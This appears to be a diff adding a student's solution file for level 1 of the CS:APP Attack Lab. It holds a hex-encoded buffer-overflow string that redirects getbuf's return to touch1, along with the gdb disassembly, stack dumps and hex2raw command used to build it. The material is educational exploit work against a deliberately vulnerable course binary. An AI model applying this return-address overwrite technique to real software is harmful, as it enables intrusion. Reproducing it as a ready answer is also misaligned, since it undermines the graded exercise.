@@ -1,0 +1,103 @@
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 60 58 55 00 00 00 00
+c0 17 40 00 00 00 00 00
+
+/*
+
+(gdb) disas touch1
+Dump of assembler code for function touch1:
+   0x00000000004017c0 <+0>:     sub    $0x8,%rsp
+   0x00000000004017c4 <+4>:     movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
+   0x00000000004017ce <+14>:    mov    $0x4030c5,%edi
+   0x00000000004017d3 <+19>:    callq  0x400cc0 <puts@plt>
+   0x00000000004017d8 <+24>:    mov    $0x1,%edi
+   0x00000000004017dd <+29>:    callq  0x401c8d <validate>
+   0x00000000004017e2 <+34>:    mov    $0x0,%edi
+   0x00000000004017e7 <+39>:    callq  0x400e40 <exit@plt>
+End of assembler dump.
+
+(gdb) disas test
+Dump of assembler code for function test:
+   0x0000000000401968 <+0>:     sub    $0x8,%rsp
+   0x000000000040196c <+4>:     mov    $0x0,%eax
+   0x0000000000401971 <+9>:     callq  0x4017a8 <getbuf>
+   0x0000000000401976 <+14>:    mov    %eax,%edx
+   0x0000000000401978 <+16>:    mov    $0x403188,%esi
+   0x000000000040197d <+21>:    mov    $0x1,%edi
+   0x0000000000401982 <+26>:    mov    $0x0,%eax
+   0x0000000000401987 <+31>:    callq  0x400df0 <__printf_chk@plt>
+   0x000000000040198c <+36>:    add    $0x8,%rsp
+   0x0000000000401990 <+40>:    retq
+End of assembler dump.
+
+(gdb) disas getbuf
+Dump of assembler code for function getbuf:
+   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
+   0x00000000004017ac <+4>:     mov    %rsp,%rdi
+   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
+   0x00000000004017b4 <+12>:    mov    $0x1,%eax
+   0x00000000004017b9 <+17>:    add    $0x28,%rsp
+   0x00000000004017bd <+21>:    retq
+End of assembler dump.
+
+(gdb) b *0x00000000004017b9
+Breakpoint 1 at 0x4017b9: file buf.c, line 16.
+
+(gdb) run -q
+Starting program: /home/suzume/testDrive/CS-APP/CS-APP-Attack-Lab/target1/ctarget -q
+Cookie: 0x59b997fa
+Type string:abcde12345
+
+Breakpoint 1, 0x00000000004017b9 in getbuf () at buf.c:16
+16      buf.c: No such file or directory.
+
+(gdb) info frame
+Stack level 0, frame at 0x5561dca8:
+ rip = 0x4017b9 in getbuf (buf.c:16); saved rip = 0x401976
+ called by frame at 0x5561dcb8
+ source language c.
+ Arglist at 0x5561dc70, args:
+ Locals at 0x5561dc70, Previous frame's sp is 0x5561dca8
+ Saved registers:
+  rip at 0x5561dca0
+
+(gdb) info registers
+rax            0x1                 1
+rbx            0x55586000          1431855104
+rcx            0x1c                28
+rdx            0x6066bb            6317755
+rsi            0x35                53
+rdi            0x7ffff7fb6980      140737353836928
+rbp            0x55685fe8          0x55685fe8
+rsp            0x5561dc78          0x5561dc78
+r8             0xa                 10
+r9             0x7c                124
+r10            0x4007af            4196271
+r11            0x246               582
+r12            0x2                 2
+r13            0x0                 0
+r14            0x0                 0
+r15            0x0                 0
+rip            0x4017b9            0x4017b9 <getbuf+17>
+eflags         0x246               [ PF ZF IF ]
+cs             0x33                51
+ss             0x2b                43
+ds             0x0                 0
+es             0x0                 0
+fs             0x0                 0
+gs             0x0                 0
+
+(gdb) x/48bx 0x5561dc78
+0x5561dc78:     0x61    0x62    0x63    0x64    0x65    0x31    0x32    0x33
+0x5561dc80:     0x34    0x35    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc88:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc90:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+0x5561dc98:     0x00    0x60    0x58    0x55    0x00    0x00    0x00    0x00
+0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00
+
+./hex2raw < ctarget-1.txt > ctarget-1-raw.txt
+
+*/
